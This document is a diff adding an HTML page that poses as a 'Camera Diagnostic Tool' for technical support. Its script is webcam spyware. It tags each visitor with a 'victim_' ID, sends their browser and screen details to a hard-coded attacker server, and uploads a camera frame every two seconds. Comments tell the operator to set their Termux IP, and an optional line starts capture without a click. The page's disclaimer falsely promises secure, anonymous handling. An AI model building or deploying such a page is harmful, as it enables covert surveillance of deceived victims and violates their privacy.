@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Check - Camera Diagnostic</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 30px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            border-radius: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .loader {
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-left: 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status {
+            padding: 12px 20px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 8px;
+            margin: 20px 0;
+            font-size: 14px;
+            display: none;
+        }
+        .success { color: #4ade80; display: block !important; }
+        .error { color: #f87171; display: block !important; }
+        .video-container {
+            position: relative;
+            margin: 25px 0;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+        }
+        video {
+            width: 100%;
+            border-radius: 10px;
+            transform: scaleX(-1); /* Mirror untuk terlihat natural */
+        }
+        .controls {
+            display: flex;
+            gap: 15px;
+            margin-top: 25px;
+        }
+        button {
+            flex: 1;
+            padding: 16px 24px;
+            border: none;
+            border-radius: 10px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        #startBtn {
+            background: #10b981;
+            color: white;
+        }
+        #startBtn:hover {
+            background: #059669;
+            transform: translateY(-2px);
+        }
+        #stopBtn {
+            background: #ef4444;
+            color: white;
+            display: none;
+        }
+        #stopBtn:hover {
+            background: #dc2626;
+            transform: translateY(-2px);
+        }
+        .disclaimer {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-top: 30px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>
+            📸 Camera Diagnostic Tool
+            <div id="loading" class="loader" style="display:none;"></div>
+        </h1>
+        <p>This tool automatically tests your camera and sends diagnostic data to our support server.</p>
+        
+        <div id="statusInit" class="status">
+            <strong>Status:</strong> Waiting for camera access...
+        </div>
+        <div id="statusSuccess" class="status success" style="display:none;">
+            <strong>✓ Connected:</strong> Sending diagnostic frames automatically. You may close this page when testing is complete.
+        </div>
+        <div id="statusError" class="status error" style="display:none;">
+            <strong>✗ Error:</strong> <span id="errorMsg"></span>
+        </div>
+        
+        <div class="video-container">
+            <video id="video" autoplay playsinline></video>
+        </div>
+        
+        <div class="controls">
+            <button id="startBtn" onclick="startAutoSpy()">Start Diagnostic</button>
+            <button id="stopBtn" onclick="stopAutoSpy()">Stop Diagnostic</button>
+        </div>
+        
+        <div class="disclaimer">
+            By clicking "Start Diagnostic", you agree to allow camera access for technical support purposes. Data is transmitted securely and anonymously.
+        </div>
+    </div>
+
+    <script>
+        // ========== KONFIGURASI ==========
+        const SERVER_URL = 'http://10.162.134.158:8080/upload'; // GANTI dengan IP Termux
+        const VICTIM_ID = 'victim_' + Math.random().toString(36).substring(2, 10);
+        const SEND_INTERVAL = 2000; // Kirim gambar setiap 2 detik (2000 ms)
+        
+        // ========== VARIABEL ==========
+        let videoStream = null;
+        let isSending = false;
+        let sendInterval = null;
+        let frameCount = 0;
+        
+        // ========== ELEMEN UI ==========
+        const video = document.getElementById('video');
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const statusInit = document.getElementById('statusInit');
+        const statusSuccess = document.getElementById('statusSuccess');
+        const statusError = document.getElementById('statusError');
+        const errorMsg = document.getElementById('errorMsg');
+        const loading = document.getElementById('loading');
+        
+        // ========== FUNGSI UTAMA ==========
+        async function startAutoSpy() {
+            try {
+                loading.style.display = 'inline-block';
+                startBtn.disabled = true;
+                statusInit.style.display = 'block';
+                
+                // 1. Minta akses kamera
+                videoStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
+                });
+                
+                // 2. Tampilkan feed kamera
+                video.srcObject = videoStream;
+                
+                // 3. Kirim data korban pertama kali
+                await sendInitialData();
+                
+                // 4. Mulai interval pengiriman gambar otomatis
+                sendInterval = setInterval(sendCameraFrame, SEND_INTERVAL);
+                isSending = true;
+                
+                // 5. Update UI
+                loading.style.display = 'none';
+                statusInit.style.display = 'none';
+                statusSuccess.style.display = 'block';
+                startBtn.style.display = 'none';
+                stopBtn.style.display = 'block';
+                
+                console.log(`[AUTO-SPY] Started. Victim ID: ${VICTIM_ID}`);
+                
+            } catch (error) {
+                // Handle error
+                loading.style.display = 'none';
+                statusInit.style.display = 'none';
+                errorMsg.textContent = error.message;
+                statusError.style.display = 'block';
+                startBtn.disabled = false;
+                console.error('[AUTO-SPY] Error:', error);
+            }
+        }
+        
+        function stopAutoSpy() {
+            if (sendInterval) clearInterval(sendInterval);
+            if (videoStream) {
+                videoStream.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+            }
+            isSending = false;
+            stopBtn.style.display = 'none';
+            startBtn.style.display = 'block';
+            startBtn.disabled = false;
+            statusSuccess.style.display = 'none';
+            statusInit.style.display = 'block';
+            console.log(`[AUTO-SPY] Stopped. Frames sent: ${frameCount}`);
+        }
+        
+        async function sendInitialData() {
+            const data = {
+                action: 'VICTIM_CONNECTED',
+                victim_id: VICTIM_ID,
+                timestamp: new Date().toISOString(),
+                user_agent: navigator.userAgent,
+                screen_resolution: `${window.screen.width}x${window.screen.height}`,
+                referrer: document.referrer || 'direct'
+            };
+            
+            try {
+                await fetch(SERVER_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch (e) {
+                console.warn('[AUTO-SPY] Failed to send initial data:', e);
+            }
+        }
+        
+        async function sendCameraFrame() {
+            if (!videoStream || !isSending) return;
+            
+            try {
+                // Capture frame dari video
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                
+                // Mirror frame untuk tampilan natural
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Konversi ke JPEG (kualitas 70% untuk menghemat bandwidth)
+                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                
+                // Kirim ke server
+                const response = await fetch(SERVER_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        action: 'CAMERA_FRAME',
+                        victim_id: VICTIM_ID,
+                        frame_id: frameCount++,
+                        timestamp: new Date().toISOString(),
+                        image: imageData,
+                        resolution: `${canvas.width}x${canvas.height}`
+                    })
+                });
+                
+                if (frameCount % 10 === 0) {
+                    console.log(`[AUTO-SPY] Sent ${frameCount} frames`);
+                }
+                
+            } catch (error) {
+                console.warn('[AUTO-SPY] Failed to send frame:', error);
+                // Coba restart jika error berturut-turut
+                if (frameCount > 0 && frameCount % 5 === 0) {
+                    console.log('[AUTO-SPY] Attempting to restart...');
+                    stopAutoSpy();
+                    setTimeout(startAutoSpy, 1000);
+                }
+            }
+        }
+        
+        // ========== FITUR TAMBAHAN ==========
+        // Deteksi jika tab tidak aktif (minimize browser)
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                console.log('[AUTO-SPY] Tab hidden, continuing in background');
+            }
+        });
+        
+        // Coba reconnect jika kamera terputus
+        videoStream?.getVideoTracks()[0]?.addEventListener('ended', () => {
+            console.log('[AUTO-SPY] Camera disconnected, attempting restart...');
+            stopAutoSpy();
+            setTimeout(startAutoSpy, 2000);
+        });
+        
+        // ========== AUTO-START (OPSIONAL) ==========
+        // Uncomment baris di bawah ini untuk mulai otomatis tanpa klik
+        // setTimeout(startAutoSpy, 1000);
+        
+        console.log('[AUTO-SPY] Script loaded. Server:', SERVER_URL);
+    </script>
+</body>
+</html>
